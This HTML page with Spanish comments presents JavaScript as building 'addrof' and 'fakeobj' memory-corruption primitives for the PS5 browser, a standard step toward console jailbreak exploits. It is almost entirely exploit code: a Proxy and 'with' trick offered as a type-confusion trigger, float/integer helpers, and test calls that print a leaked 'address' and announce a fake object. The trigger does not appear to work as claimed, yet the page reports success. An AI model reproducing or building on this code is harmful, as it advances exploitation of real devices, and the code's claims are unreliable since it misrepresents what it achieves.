<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>PS5 addrof/fakeobj Primitives</title>
  <style>
    body { background: black; color: lime; font-family: monospace; }
    #log { white-space: pre-wrap; }
  </style>
</head>
<body>
<h1>Primitivas addrof / fakeobj en PS5</h1>
<div id="log"></div>

<script>
function log(msg) {
    document.getElementById('log').textContent += msg + "\n";
}

// Utilidades para convertir entre floats y integers
const buf = new ArrayBuffer(8);
const f64_buf = new Float64Array(buf);
const u64_buf = new BigUint64Array(buf);

function f2i(f) {
    f64_buf[0] = f;
    return u64_buf[0];
}

function i2f(i) {
    u64_buf[0] = i;
    return f64_buf[0];
}

// Vamos a intentar crear el fallo usando Proxy
function setupPrimitives() {
    let leak_obj = { leak: 13.37 };
    let victim = { a: 1 };

    let proxy = new Proxy({}, {
        has(target, key) {
            if (key === 'leak') {
                // Simula que "leak" no existe realmente
                return false;
            }
            return Reflect.has(target, key);
        }
    });

    let addr = undefined;

    // Intentamos capturar un tipo confuso
    with (proxy) {
        try {
            addr = leak_obj.leak;
        } catch (e) {
            log("Error durante el leak: " + e);
        }
    }

    if (addr === undefined) {
        throw new Error("Falló el leak, no se construyó la primitiva.");
    }

    // Creamos primitivas
    function addrof(obj) {
        leak_obj.leak = obj;
        with (proxy) {
            return f2i(leak_obj.leak);
        }
    }

    function fakeobj(addr) {
        leak_obj.leak = i2f(addr);
        with (proxy) {
            return leak_obj.leak;
        }
    }

    return { addrof, fakeobj };
}

try {
    let { addrof, fakeobj } = setupPrimitives();

    log("[+] Primitivas construidas correctamente.");
    
    // Prueba de addrof
    let obj = {p: 42};
    let obj_addr = addrof(obj);
    log("[+] Dirección del objeto obj: 0x" + obj_addr.toString(16));

    // Prueba de fakeobj
    let fake = fakeobj(obj_addr);
    log("[+] Fake object creado!");

} catch (e) {
    log("[!] Error: " + e);
}
</script>

</body>
</html>
